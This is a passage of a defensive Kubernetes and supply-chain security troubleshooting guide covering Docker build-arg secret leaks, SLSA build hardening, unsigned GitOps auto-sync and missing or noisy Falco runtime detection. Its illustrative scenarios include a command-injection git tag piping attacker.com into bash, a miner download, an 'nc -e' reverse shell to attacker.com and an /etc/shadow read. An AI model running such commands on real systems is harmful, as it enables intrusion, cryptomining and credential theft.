  1. --build-arg used for secrets: docker build --build-arg SECRET_KEY=xyz embeds the value in the image's build history. Every docker history command reveals the secret. Build args are for build-time configuration — NOT secrets. Use --secret (BuildKit) instead.
  2. ARG persisted in intermediate layer despite not being in final: ARG DB_PASSWORD; RUN echo $DB_PASSWORD stores the ARG value in the layer metadata even if the environment variable is not set in the final image. The password is in docker history permanently.
  3. CI pipeline passes secrets as build args: CI script: docker build --build-arg NPM_TOKEN=${{ secrets.NPM_TOKEN }}. The CI secrets are now in the image history — visible to anyone who pulls the image. The secret leaked from CI → image → public registry.
  4. ENV instruction inherits ARG value: ARG DB_PASSWORD; ENV DB_PASSWORD=$DB_PASSWORD — the ARG is promoted to ENV, which persists in the final container. docker inspect shows ALL ENV values. The secret is now in image metadata AND container environment.
  5. No BuildKit secret mounting: Docker BuildKit supports RUN --mount=type=secret,target=/run/secrets/db_password which mounts the secret at build time WITHOUT storing it in any layer. The team doesn't use BuildKit — they use legacy --build-arg for secrets.
🟡5 Less Likely Causes
  1. Secret in COPY instruction layer: COPY .env /app/.env copies a file containing secrets into the image layer. Even if RUN rm /app/.env in a later layer, the previous layer still has the file — accessible via docker save and layer extraction.
  2. Secret in RUN command output captured in layer: RUN curl -H "Authorization: Bearer $TOKEN" https://api.example.com — the token is in the command string stored in the layer metadata. The token is visible in docker history.
  3. Docker layer squashing doesn't remove ARG metadata: docker build --squash squashes layers but doesn't remove the ARG values from the image configuration. The secrets are still in docker history after squashing.
  4. Multi-stage build copies ARG into final stage: ARG DB_PASSWORD in the builder stage; COPY --from=builder /app /app copies files but the ARG value in the builder stage is still in the builder layers — accessible from the registry if they're not garbage-collected.
  5. Build cache on CI runner contains secrets: CI runner caches Docker layers including ARG metadata. The next build on the same runner may leak the previous build's secrets if cache is shared across pipelines.
🟣5 New Cluster Causes
  1. BuildKit not enabled (DOCKER_BUILDKIT=1): Legacy Docker builds don't support --secret. CI uses old Docker without BuildKit — forcing teams to use --build-arg for secrets.
  2. Developers unaware that build args appear in history: The mental model is "ARG is just a variable for the build." No one knows docker history reveals ARG values — every developer using --build-arg for secrets is leaking them unknowingly.
  3. CI pipeline template uses build args for secrets: The standard CI template has --build-arg SECRET=$SECRET — every team using the template leaks secrets into image history.
  4. No image scanning for secrets post-build: trufflehog or ggshield not scanning Docker images for exposed secrets before push. The leaked secret goes undetected all the way to the registry.
  5. Build args documented as the way to pass secrets: Internal documentation says "use --build-arg to pass credentials to the build." The documentation is teaching the insecure pattern.
🔍 What to Look At:
docker history anihpj/jobpost-api:v1.2 --no-trunc | grep -iE "password|secret|token|key|ARG" Search image history for sensitive values passed as build args. Any match is a leaked secret permanently embedded in the image.
docker inspect anihpj/jobpost-api:v1.2 | jq '.[0].Config.Env' Check ENV values in the image. Any secrets stored as environment variables are visible to anyone who can pull or inspect the image.
cat Dockerfile | grep -E "ARG|ENV|--build-arg" Review the Dockerfile for ARG instructions that may be receiving secrets. Each one is a potential secret leak in image history.
🎯 #1 Root Cause: --build-arg is used to pass secrets during Docker builds. Build args are stored in the image history in plaintext — docker history reveals every build argument value, including passwords, tokens, and keys. These secrets are permanently embedded in the image and accessible to anyone with pull access.
🔧 How to Solve:
1. Use BuildKit --secret, NEVER --build-arg for secrets DOCKER_BUILDKIT=1 docker build --secret id=db_password,src=./secret.txt -t anihpj/jobpost-api . # In Dockerfile: RUN --mount=type=secret,id=db_password cat /run/secrets/db_password BuildKit secrets are mounted temporarily during the RUN — they are NOT stored in any image layer and NOT visible in docker history.
2. Enable BuildKit in CI export DOCKER_BUILDKIT=1 All CI pipelines must use BuildKit. Legacy Docker builds without BuildKit should be deprecated — they don't support secure secret handling.
3. Rotate all secrets that were passed as build args Every password, token, or key passed via --build-arg is COMPROMISED — it's in the image history of every image built with that arg. Rotate them immediately. The old values are permanently exposed.
4. Scan images for secrets BEFORE pushing to registry trufflehog filesystem /tmp/image-extracted; ggshield scan docker anihpj/jobpost-api:v1.2 CI step: extract image layers and scan for secrets. Fail the build if ANY secret pattern is detected. The image never reaches the registry with embedded secrets.
5. Use .dockerignore to exclude secret files from build context Add .env, *.key, *.pem, secrets/ to .dockerignore. These files are never sent to the Docker daemon — they can't be accidentally copied or used as build args.
💡 Personal Advice:
--build-arg prints secrets in docker history. Forever. Every person who pulls your image can docker history --no-trunc and see every build argument. If you passed --build-arg DB_PASSWORD=..., your database password is now visible to: every developer with registry access, every CI pipeline, and anyone who pulls your public image. Use BuildKit --secret. This is not optional.
BuildKit secrets are the ONLY secure way to pass secrets to builds. BuildKit mounts secrets as temporary files that exist ONLY during the RUN instruction. They're never stored in layers, never in image history, never in image metadata. DOCKER_BUILDKIT=1 should be the default in every CI pipeline.
SC19
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC19
No SLSA Level 2+ Attestation — Build Platform Not Hardened

🔍 Symptom: The CI pipeline generates SLSA Level 1 provenance (basic build metadata), but the build platform (GitHub Actions / GitLab CI) has NOT been hardened to meet SLSA Level 2 or 3 requirements. The build runs on a shared CI runner with other projects — isolation is not guaranteed. Build parameters are not cryptographically verified. The provenance is signed by a key stored in CI secrets — which could be exfiltrated by a compromised workflow. SLSA Level 1 proves the build happened. SLSA Level 2+ proves the build was TAMPER-RESISTANT — and that's what's missing.

  cosign verify-attestation --type slsaprovenance anihpj/jobpost-api:v1.2 | jq '.predicate.buildType'
  "https://slsa.dev/container/v1"   ← SLSA Level 1 only

  # Missing for SLSA Level 2+:
  # - Isolated build environment (not shared runners)
  # - Signed build configuration (pipeline definition verified)
  # - Hermetic builds (no network access during build)
🔴5 Most Likely Causes
  1. Build runs on shared CI runners: GitHub Actions shared runners and GitLab shared runners run builds from MULTIPLE organizations on the same VM. A malicious build from another project could escape isolation and compromise your build — injecting code into your image. SLSA Level 2 requires isolated (self-hosted or ephemeral) runners.
  2. Build pipeline definition not signed or verified: The CI workflow YAML (.github/workflows/build.yml) is not cryptographically signed. An attacker who modifies the workflow can change build parameters, add malicious steps, or disable security checks — and the provenance won't reflect the tampering. SLSA Level 3 requires signed build configurations.
  3. Build has unrestricted network access: pip install and apt-get in the Dockerfile pull from the internet. A dependency confusion attack or compromised registry can inject malicious packages during the build. SLSA Level 3 recommends hermetic builds — all dependencies are pre-fetched and verified.
  4. Signing key stored in CI secrets (not hardware token): The Cosign private key is in ${{ secrets.COSIGN_KEY }} — a CI secret that can be exfiltrated by a compromised workflow or a malicious PR. SLSA Level 2+ requires signing keys in hardware tokens (YubiKey, KMS) or using keyless signing (Fulcio/OIDC).
  5. No build reproducibility requirement: Two builds from the same commit produce different images. This violates SLSA Level 3's requirement for bit-for-bit reproducibility. Non-reproducible builds can't be independently verified — you must trust the builder implicitly.
🟡5 Less Likely Causes
  1. Build input materials not recorded in provenance: The SLSA provenance has materials: []. It doesn't record: the exact source commit, the Dockerfile digest, or the base image digest. The provenance is incomplete — you can't reconstruct what went into the build.
  2. Build parameter injection via git tag/branch name: The CI pipeline uses git tag as the version number. An attacker creates a tag with shell metacharacters: v1.2.3; curl attacker.com/backdoor | bash. The CI pipeline executes the injected command. Build parameters from untrusted sources must be sanitized.
  3. No ephemeral build environment: Each build reuses the same CI runner. Artifacts from the previous build (cached dependencies, environment variables, temporary files) may persist and contaminate the next build.
  4. No two-person review for build configuration changes: Changes to CI pipeline YAML are merged after a single review. A compromised developer account can modify the build to inject malicious steps — and the review is the only gate. SLSA Level 3 requires two-party approval for build configuration changes.
  5. No verification of the provenance generation tool: The provenance is generated by a CI plugin that itself could be compromised. The plugin's integrity is not verified — a compromised plugin can generate false provenance claiming a secure build while injecting backdoors.
🟣5 New Cluster Causes
  1. SLSA framework unknown beyond "generate provenance": The team knows SLSA = provenance. They don't know SLSA has 4 levels with increasing security requirements for the BUILD PLATFORM itself.
  2. No SLSA level target defined: The organization hasn't decided which SLSA level to target (1, 2, 3, or 4). Without a target, there's no roadmap for hardening the build platform.
  3. Self-hosted runners not set up: Using shared CI runners because they're free and easy. Self-hosted (isolated) runners require infrastructure investment that hasn't been prioritized.
  4. No build platform security review: Application code and Kubernetes clusters are reviewed for security. The CI pipeline itself — the thing that produces ALL the artifacts — has never been in scope for a security assessment.
  5. Provenance is "Phase 1" — hardening is "Phase 2": The team just finished implementing provenance generation. Hardening the build platform to reach SLSA Level 2+ is the next phase — with no timeline or owner.
🔍 What to Look At:
cosign verify-attestation --type slsaprovenance anihpj/jobpost-api:v1.2 | jq '.predicate.buildType' The buildType and predicate contents indicate the SLSA level. Level 1 has basic metadata. Level 2+ includes builder ID, build config, and hermeticity claims.
cat .github/workflows/build.yml | grep -E "runs-on:|COSIGN_KEY|build-arg" Check if CI uses shared runners (runs-on: ubuntu-latest) and if signing keys are in CI secrets. Both indicate SLSA Level 1 only.
slsa-verifier verify-image anihpj/jobpost-api:v1.2 --source-uri github.com/anihpj/jobpost --builder-id https://github.com/slsa-framework/slsa-github-generator/.github/workflows/builder_docker-based_slsa3.yml@refs/tags/v2.0.0 Use slsa-verifier to check the provenance against the expected builder. If it fails, the build platform is not at the claimed SLSA level.
🎯 #1 Root Cause: The build platform (CI) has not been hardened beyond SLSA Level 1. Builds run on shared runners without isolation, build configurations are unsigned, and signing keys are stored in CI secrets. This means provenance can be generated — but it cannot guarantee that the build was tamper-resistant or that the signing key wasn't compromised.
🔧 How to Solve:
1. Move to isolated (self-hosted) build runners Use GitHub Actions self-hosted runners or GitLab-specific runners — NOT shared runners. Each build gets a clean, isolated VM. No cross-organization contamination. SLSA Level 2 requirement.
2. Use keyless signing with OIDC (Fulcio) cosign sign --fulcio-url=https://fulcio.sigstore.dev --rekor-url=https://rekor.sigstore.dev anihpj/jobpost-api:${TAG} The CI platform's OIDC token is the identity — no long-lived signing key to store or leak. SLSA Level 2+ compatible.
3. Implement hermetic builds Pre-fetch all dependencies. Run pip install from a local cache, not from PyPI. Dockerfile uses ONLY pre-fetched packages. No network access during build. This prevents dependency confusion and registry compromise during the build.
4. Sign build configurations and require two-party review CI workflow YAML changes require two approvals. The merged workflow is signed. Provenance records the workflow digest — verifying that the build used an approved, signed configuration.
5. Define SLSA level target and roadmap Start with Level 2 (isolated runners + keyless signing). Move to Level 3 (hermetic builds + signed configs). Level 4 is achievable with fully reproducible builds and hardware-based attestation.
💡 Personal Advice:
SLSA Level 1 tells you the build happened. Level 2+ tells you the build can be TRUSTED. Provenance at Level 1 says "we built this." But if the build ran on a shared runner next to an attacker's build, the provenance is just a receipt — not a guarantee. Level 2+ addresses: isolated environment, keyless signing, hermetic dependencies. This is where supply chain trust actually begins.
Keyless signing is a game-changer. You don't have to protect a key — because there IS no key. Fulcio issues short-lived certificates based on OIDC identity (your CI platform's token). The certificate is valid for 10 minutes — just long enough to sign the image. No long-lived key to store, rotate, or leak. This is the future of image signing.
SC20
📦 CATEGORY 5: SUPPLY CHAIN SECURITY — Issue SC20
GitOps Reconciliation Without Signature Verification — Auto-Deploy Malware

🔍 Symptom: ArgoCD / Flux is configured to automatically sync from the anihpj/jobpost-deploy Git repository. When a PR is merged to main, the GitOps controller applies the Kubernetes YAML to the cluster — WITHOUT verifying that the YAML was signed, WITHOUT checking that the container images have Cosign signatures, and WITHOUT validating that the commit came from an authorized user. An attacker who compromises the Git repo (or the CI token that pushes to it) can merge malicious YAML — deploying privileged pods, creating backdoor ClusterRoleBindings, or exfiltrating Secrets — and ArgoCD deploys it AUTOMATICALLY within 3 minutes.

  argocd app get anihpj-api --show-params
  Repository: https://github.com/anihpj/jobpost-deploy
  Sync Policy: Automated (Prune: true, Self-Heal: true)
  # ANY merge to main → automatically deployed in 3 minutes!

  kubectl get application anihpj-api -n argocd -o yaml | grep -A5 "syncPolicy\|signature"
  syncPolicy: {automated: {prune: true, selfHeal: true}}
  # No signature verification configured!
🔴5 Most Likely Causes
  1. ArgoCD auto-sync enabled without signature verification: syncPolicy: {automated: {}} deploys changes automatically. If the Git repo is compromised, the malicious YAML is deployed to the cluster within minutes — no human reviews it, no signature is checked.
  2. Git commit signing not enforced: Commits to the deploy repo don't require GPG/SSH signatures. An attacker with push access (compromised token, malicious insider) can push unsigned commits — ArgoCD deploys them without question.
  3. No image signature verification before sync: ArgoCD doesn't verify that container images in the YAML have valid Cosign signatures. If an attacker changes the image tag to a malicious image, ArgoCD deploys it as long as the YAML is valid Kubernetes.
  4. No drift detection alerting on unauthorized changes: ArgoCD self-healing will REVERT manual changes to match the Git state. But if Git is compromised, self-healing AUTOMATICALLY applies the attacker's changes and reverts any manual fix. The automation fights the incident responder.
  5. Single Git branch deploys to all environments: The main branch deploys to production directly. There's no promotion path (dev → staging → prod). A compromise of main == compromise of production. GitOps should use separate branches or directories per environment with promotion gates.
🟡5 Less Likely Causes
  1. ArgoCD admin credentials in Git: The argocd-initial-admin-secret or the admin password reset token was committed to Git. Anyone who finds it can log into ArgoCD as admin and manually trigger syncs, delete applications, or change sync policies.
  2. Flux/ArgoCD ServiceAccount with cluster-admin: The GitOps controller's ServiceAccount has cluster-admin because "it needs to deploy everything." If the controller is compromised, the attacker has unrestricted cluster access through the GitOps reconciliation.
  3. No Kubernetes schema validation before sync: ArgoCD applies the YAML even if it contains invalid fields or unknown resources. A malicious YAML with apiVersion: v1\nkind: Pod\nspec:\n privileged: true is applied without validation that privileged pods are against policy.
  4. GitOps reconciliation applies YAML from external Helm repos: The ArgoCD Application sources a Helm chart from https://charts.anihpj.com. If the chart repo is compromised, the next sync pulls the malicious chart and deploys it. Chart signatures are not verified before sync.
  5. No rate limiting or circuit breaker on sync failures: A malicious YAML with a syntax error causes sync failures every 3 minutes. ArgoCD retries indefinitely — flooding the API server with requests. This is a DoS attack from within the GitOps pipeline.
🟣5 New Cluster Causes
  1. GitOps deployed for speed, not security: ArgoCD was installed because "it automatically deploys on merge." The security implications of automatic deployment from an unverified source were not considered.
  2. No branch protection on deploy repo: main branch has no protection rules: no required reviewers, no required status checks, no signed commits required. Anyone with push access can merge anything.
  3. ArgoCD/Flux not configured with security best practices: Default installation. No signature verification, no RBAC restrictions, no project scoping, no image updater restrictions.
  4. GitOps treated as "infrastructure" and exempt from security review: The security team reviewed application deployments but not the GitOps pipeline itself. The tool that deploys EVERYTHING was not in scope.
  5. No canary or blue-green deployment strategy: Auto-sync deploys to ALL pods simultaneously. There's no gradual rollout — a malicious change affects 100% of traffic immediately. No time to detect and rollback before impact.
🔍 What to Look At:
kubectl get application -A -o yaml | grep -A10 "syncPolicy" Check if auto-sync is enabled. automated: {} means ANY change to Git is deployed automatically. Combined with no signature verification, this is a supply chain time bomb.
kubectl get application -A -o yaml | grep -i "signature\|verify" Check if ArgoCD is configured to verify GPG signatures on commits or Cosign signatures on images. Absence means no cryptographic verification of what's being deployed.
argocd app diff anihpj-api Check what would change on the next sync. If unexpected resources appear, the Git repo may have been tampered with — and auto-sync will deploy them.
🎯 #1 Root Cause: GitOps auto-sync is enabled without commit signature verification or image signature verification. Any change merged to the Git repository — including malicious YAML from a compromised account — is automatically deployed to the cluster within minutes, bypassing all human review and security gates.
🔧 How to Solve:
1. Enforce signed commits on the deploy repo GitHub branch protection: require signed commits. All commits to the deploy branch must be GPG or SSH-signed by an authorized user. ArgoCD verifies the signature before syncing.
2. Enable ArgoCD signature verification argocd app set anihpj-api --verify-signatures ArgoCD verifies GPG signatures on commits before applying. Unsigned commits are rejected — even if they're merged to the branch.
3. Add pre-sync OPA/Kyverno policy validation ArgoCD sync hooks or Kyverno admission policy: validate every resource before it's applied. Block privileged pods, hostPath mounts, and cluster-admin ClusterRoleBindings — even if they come from Git.
4. Use separate branches/directories per environment with promotion env/dev auto-syncs. env/staging requires manual sync. env/prod requires manual sync + approval. Production NEVER auto-syncs — a human must approve. This is the GitOps promotion pattern.
5. Require two-person review on deploy repo PRs Branch protection: minimum 2 approving reviews. CODEOWNERS file: specific teams must approve changes to specific paths. No single compromised account can merge to production.
💡 Personal Advice:
Auto-sync without verification = attacker's dream pipeline. An attacker who gets push access to your deploy repo doesn't need to access your cluster — ArgoCD will deploy their malicious YAML FOR THEM, automatically, in 3 minutes. If auto-sync is on, commit signature verification and image signature verification are NOT optional. They're the only things standing between "PR merged" and "cluster owned."
Production should NEVER auto-sync. Always require a human. Auto-sync is great for dev and staging. Production should require a manual sync — a human clicks "Sync" in ArgoCD after reviewing the diff. This creates a human-in-the-loop security gate that automation cannot bypass. 3 minutes of manual review saves days of incident response.

📊 Category 6: Monitoring & Runtime Security (20 Issues)ML1-ML20

🟢 Monitoring & Runtime Security — Falco, Audit Logs, Threat Detection, Behavioral Analytics

Monitoring and Runtime Security is your last line of defense. Prevention (RBAC, NetworkPolicy, PSS) reduces attack surface — but when prevention fails, you need detection. Falco catches runtime threats (reverse shells, crypto miners, container escapes). Audit logs provide forensic evidence. Behavioral analytics detect anomalies that signatures miss. For anihpj/jobpost, every suspicious process, unexpected network connection, and filesystem modification must generate an alert — and alerts must trigger automated response, not just emails.

📌 ML1–ML4: Falco Deployment, Rule Tuning, Audit Logs & Behavioral Baselines

ML1
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML1
Falco Not Deployed — Zero Runtime Threat Detection

🔍 Symptom: An attacker RCE'd into the anihpj-api pod via an insecure deserialization vulnerability 3 weeks ago. They've been running a crypto miner, exfiltrating database credentials, and probing internal services — completely undetected. kubectl get pods -n falco returns No resources found — Falco is not installed. There's NO runtime security tool watching for: shell spawned in container, unexpected outbound connections, filesystem writes to /bin, privilege escalation, or container escape syscalls. The attacker has been living in the cluster for 21 days with zero detection.

  kubectl get pods -n falco
  No resources found in falco namespace.   ← FALCO NOT INSTALLED!

  kubectl exec anihpj-api -n anihpj -- /bin/bash -c "curl -s attacker.com/xmrig | bash"
  [*] Starting XMRig miner...   ← CRYPTO MINER RUNNING — NO ALERT!

  kubectl exec anihpj-api -n anihpj -- nc -e /bin/bash attacker.com 4444
  # Reverse shell established — no Falco rule triggered because Falco isn't there!
🔴5 Most Likely Causes
  1. Falco never installed: The cluster was set up without any runtime security tooling. Falco Helm chart was never deployed. There's no kernel-level syscall monitoring — all container activity is invisible to security tooling.
  2. Falco considered "optional monitoring": The team views Falco as a nice-to-have monitoring tool, not an essential security control. Budget and time were allocated to network security and RBAC — runtime detection was deprioritized.
  3. Perception that "prevention is enough": The team invested heavily in NetworkPolicy, PSS, and RBAC. They believe these controls prevent all attacks — not realizing that defense-in-depth requires DETECTION when prevention inevitably fails.
  4. Falco requires kernel module or eBPF probe: Installing Falco requires either a kernel module (falco-probe) or eBPF probe on every node. The ops team is hesitant to install kernel-level components — "what if it crashes the node?" Modern Falco uses eBPF which is safe and supported by all major Linux distributions.
  5. No security team or SOC to respond to alerts: "Why deploy Falco if no one will look at the alerts?" This chicken-and-egg problem prevents deployment. Start with Falco + Falcosidekick to forward alerts to existing channels (Slack, PagerDuty) — even without a dedicated SOC.
🟡5 Less Likely Causes
  1. Falco installed but DaemonSet not scheduled: Falco is installed but the DaemonSet has nodeSelector or tolerations that don't match any nodes. All Falco pods are Pending — no runtime monitoring is actually happening.
  2. Falco installed but eBPF probe fails to load: The node's kernel is too old for the eBPF probe. Falco pods start but the probe fails — Falco runs without syscall monitoring. No events are generated — and the failure is silent.
  3. Falco installed in userspace mode (no driver): Falco is running in userspace mode without kernel instrumentation — it only sees syscalls from the Falco process itself. No container events are captured. This mode is for testing only, not production.
  4. Managed Kubernetes blocks kernel-level tools: EKS Fargate, GKE Autopilot, and AKS with containerd-only may restrict kernel module loading. Falco requires specific configuration for these environments — the default install fails silently.
  5. Falco OOMKilled due to insufficient memory: Falco pods have no resource limits and get OOMKilled on nodes with high syscall volume. The DaemonSet restarts them — but there are gaps in monitoring during the CrashLoopBackOff periods.
🟣5 New Cluster Causes
  1. Security tooling not in default cluster setup: kubeadm and managed Kubernetes (EKS/AKS/GKE) don't install Falco by default. It's a manual post-installation step that is easily skipped.
  2. No security monitoring requirement: The organization's security policy requires network security and RBAC — but runtime detection is not mandated. Falco is not on any compliance checklist.
  3. Startup mentality: "we'll add monitoring later": Early-stage teams focus on shipping features. Security monitoring is "Phase 2" — which becomes "Phase Never" after launch.
  4. Falco unknown to the platform team: The team uses Prometheus/Grafana for metrics and EFK for logs. They're unaware that Falco exists or that it provides a fundamentally different type of visibility (syscall-level threat detection).
  5. No budget for commercial runtime security: Commercial alternatives (Sysdig Secure, Aqua, Prisma Cloud) require licensing. The team doesn't know that Falco (OSS) provides equivalent runtime detection for free.
🔍 What to Look At:
kubectl get pods -n falco If the namespace doesn't exist or has no pods, Falco is not deployed. This means ZERO runtime threat detection — any attacker activity inside containers is invisible.
kubectl logs -n falco -l app=falco --tail=5 If Falco is deployed, check that events are flowing. Look for syscall event log lines. If logs are empty or show errors, Falco is running but not monitoring.
kubectl exec <any-pod> -- cat /etc/shadow 2>/dev/null; sleep 3; kubectl logs -n falco -l app=falco --tail=20 | grep "Read sensitive file" Trigger a known Falco rule (reading /etc/shadow). If no alert appears in Falco logs, Falco is either not installed or not functioning.
🎯 #1 Root Cause: Falco (or any runtime security tool) is not deployed in the cluster. There is zero visibility into container syscalls, spawned processes, network connections, or filesystem modifications. An attacker can operate undetected inside a compromised container for weeks — running crypto miners, exfiltrating data, and probing internal services with no alerts.
🔧 How to Solve:
1. Install Falco via Helm helm repo add falcosecurity https://falcosecurity.github.io/charts helm install falco falcosecurity/falco --namespace falco --create-namespace --set falco.driver.kind=ebpf Deploys Falco as a DaemonSet on every node. eBPF probe monitors syscalls without a kernel module. Events start flowing within seconds.
2. Install Falcosidekick for alert routing helm install falcosidekick falcosecurity/falcosidekick --namespace falco --set config.slack.webhookurl=<url> Forwards Falco alerts to Slack, PagerDuty, Opsgenie, or any webhook. Even without a SOC, alerts reach the on-call engineer in real time.
3. Verify Falco is generating events kubectl logs -n falco -l app=falco --tail=50 | grep -c "Warning\|Critical" If the count is 0, Falco is not detecting anything — check driver status. Trigger a test: kubectl exec <pod> -- cat /etc/shadow and verify an alert fires.
4. Enable Falco alerting for critical rules Critical alerts (container escape, reverse shell, crypto miner): route to PagerDuty → wake up on-call engineer. Warning alerts (unexpected process, sensitive file read): route to Slack for review during business hours.
5. Integrate Falco with admission control (future) Falco Talon or Kyverno + Falco: when Falco detects a threat, automatically trigger a response — delete the pod, isolate the namespace, or revoke the ServiceAccount token. Move from detection to automated response.
💡 Personal Advice:
Without Falco, you're blind. Attackers know this. Every attacker assumes the cluster has no runtime detection — because most clusters don't. Deploying Falco flips the script: now they have to evade syscall monitoring, process tracking, and network anomaly detection. Falco is the difference between "attacker undetected for 3 weeks" and "attacker detected in 3 seconds."
eBPF is safe and production-ready. Install Falco today. Modern Falco uses eBPF — no kernel module, no node instability. It's the same technology used by Cilium, Pixie, and cloud providers for networking and observability. If you're running a 5.x+ kernel, you can run Falco with eBPF. There's no excuse for not having runtime detection in 2026.
ML2
📊 CATEGORY 6: MONITORING & RUNTIME — Issue ML2
Falco Rules Too Noisy — Critical Alerts Buried in 10,000 False Positives

🔍 Symptom: Falco IS deployed, but it generates 10,000+ alerts per day — 99% are false positives. The security team has alert fatigue: they've muted the Falco Slack channel, ignored the PagerDuty notifications, and stopped investigating. Meanwhile, a REAL attack — a reverse shell from anihpj-api to an external IP — fired a Falco alert. It was buried among 9,999 "Unexpected process" alerts from legitimate CI pipelines, health checks, and cron jobs. The one critical alert that mattered was ignored because the signal-to-noise ratio is abysmal.

  kubectl logs -n falco -l app=falco --tail=100 | grep -c "Warning\|Critical\|Error"
  98   ← 98 alerts in the last 100 log lines!

  kubectl logs -n falco -l app=falco --tail=1000 | grep "Reverse shell"
  Warning Reverse shell from container (user=root anihpj-api)   ← BURIED IN NOISE!
🔴5 Most Likely Causes
  1. Default Falco rules not tuned for your environment: Falco ships with default rules that are GENERIC — they detect ALL shell spawns, ALL unexpected processes, ALL file writes. In a busy production cluster, these fire thousands of times per hour. Rules must be tuned: exclude known-safe processes, specific binaries, and legitimate network destinations.
  2. No macro overrides for legitimate activity: Falco macros (allowed_sshd_procs, known_containers) can exclude entire categories of safe activity. If macros aren't customized, Falco alerts on: kubelet health checks, Istio sidecar probes, Prometheus node exporters, and every CI pipeline run.
  3. "Unexpected process" rule fires on every shell command: The Run shell untrusted rule fires whenever ANY process spawns a shell. This includes: kubectl exec by developers, CI pipeline scripts, and health check commands. The rule is too broad for environments where developers legitimately exec into pods.
  4. No alert severity differentiation: All alerts are routed to the SAME channel with the SAME priority. "Reverse shell detected" and "process spawned in container" both go to Slack as "Warning." Without severity tiers (INFO → WARNING → CRITICAL → EMERGENCY), critical alerts get the same attention as noise.
  5. No per-namespace or per-workload rule customization:
    6. The same rules apply to production AND CI namespaces. CI namespace generates 80% of the alerts. Falco supports per-namespace rule scoping (container.namespace != ci) — but it's not configured.
🟡5 Less Likely Causes
  1. Falco rules alert on legitimate security tools: Vulnerability scanners, config auditors, and chaos engineering tools trigger Falco rules because they do "attacker-like" things: read sensitive files, spawn shells, make network connections. These tools need explicit exceptions.
  2. Falcosidekick forwards everything — no deduplication: Falcosidekick forwards every single Falco event to Slack/PagerDuty. There's no deduplication — 100 identical alerts from a CI pipeline create 100 Slack messages. Implement rate limiting: max 1 alert per rule per 5 minutes.
  3. No alert context enrichment: Falco alerts say "process spawned in container" — but don't say WHICH deployment, WHICH namespace, or WHICH image. Without context, every alert requires manual investigation. Enrich alerts with Kubernetes metadata (namespace, pod, deployment, image).
  4. Rules not updated after application changes: A new microservice was deployed that legitimately runs nmap for service discovery. Falco alerts on every scan. The rule was never updated to allow nmap in this specific container. Rules must evolve with the application.
  5. No feedback loop from alert triage: When an alert is investigated and determined to be a false positive, there's no mechanism to add an exception. The same alert fires again tomorrow — and tomorrow's on-call engineer investigates it again. Automate: "mark as false positive" → adds a macro exception.
🟣5 New Cluster Causes
  1. Falco installed with default rules — never tuned: The Helm install was the first and last interaction with Falco rules. No one ever customized rules for the cluster's specific workloads and behavior patterns.
  2. No rule tuning process or ownership: No one is responsible for reviewing Falco alerts and tuning rules. "Who owns Falco rule tuning?" has no answer — so it doesn't happen.
  3. Alert fatigue set in before tuning began: The team installed Falco, got flooded with alerts on day 1, and muted everything. They never reached the tuning phase because the noise was overwhelming from the start.
  4. No baseline period before enabling alerting: Best practice: run Falco in --dry-run mode for 2 weeks to establish a baseline. Identify noisy rules. Tune exceptions. THEN enable alerting. Skipping the baseline means instant alert fatigue.
  5. No gradual rollout of rules: Instead of enabling all 80+ default rules at once, start with 5 critical rules (reverse shell, crypto miner, container escape). Once those are clean, add 5 more. Gradual rollout prevents overwhelming the team.
🔍 What to Look At:
kubectl logs -n falco -l app=falco --tail=1000 | jq -r '.rule' | sort | uniq -c | sort -rn See which Falco rules fire most frequently. The top 3 rules with the highest count are likely generating the most noise — tune these first.
kubectl get cm falco-rules -n falco -o yaml | grep -E "condition:|output:|priority:" Review custom macros and exceptions. If the ConfigMap has zero customizations (only defaults), the rules are not tuned for your environment.
kubectl logs -n falco -l app=falco --tail=5000 | grep "CRITICAL\|EMERGENCY" | wc -l Check how many CRITICAL alerts fired recently. If the ratio of WARNING:CRITICAL is 1000:1, critical alerts are buried in noise.
🎯 #1 Root Cause: Falco is deployed with default rules that generate thousands of false positives per day. Rules are not tuned for the specific workloads (CI pipelines, health checks, monitoring agents) or namespaces (excluding CI from production rules). Alert fatigue has muted all notifications — including the one real reverse shell alert that fired during an actual attack.
🔧 How to Solve:
1. Run Falco in dry-run mode for 2 weeks to establish baseline helm upgrade falco falcosecurity/falco --set falco.dryRun=true Falco logs events but does NOT trigger alerts. Collect event data. Identify the top 10 noisy rules — these need tuning before alerting is enabled.
2. Add macro exceptions for known-safe processes Edit falco_rules.local.yaml: add macros for CI namespace, kubelet health checks, Istio probes, Prometheus exporters. Append and not <macro> to noisy rules. Each exception reduces noise by 5-10%.
3. Implement alert severity routing CRITICAL (reverse shell, container escape, crypto miner): PagerDuty → wake up on-call. WARNING (unexpected process, sensitive file): Slack → review during business hours. INFO (shell spawn, file write): aggregate into daily report → no real-time alert.
4. Enable deduplication and rate limiting Falcosidekick config: slack.minimumpriority: warning, slack.maxmessages: 5/minute. Deduplicate identical alerts within 5 minutes. One alert per unique rule+container combination per 5 minutes.
5. Enrich alerts with Kubernetes context Enable -k flag: Falco adds k8s.ns.name, k8s.pod.name, container.image.repository to every alert. Each alert says: "Reverse shell from anihpj-api (namespace: anihpj, deployment: anihpj-api, image: anihpj/jobpost-api:v1.2)" — actionable context without manual investigation.
💡 Personal Advice:
Untuned Falco is worse than no Falco. Without Falco, you know you're blind — and you compensate with other controls. With untuned Falco, you THINK you have detection — but every alert is ignored due to fatigue. The real attack alert is buried in noise. Tune rules BEFORE enabling alerting. Dry-run first. Exceptions second. Alerting last.
Start with 5 rules, not 80. Build up gradually. Enable only the most critical rules first: Reverse Shell, Crypto Miner, Container Escape, Privileged Container, Sensitive File Access.
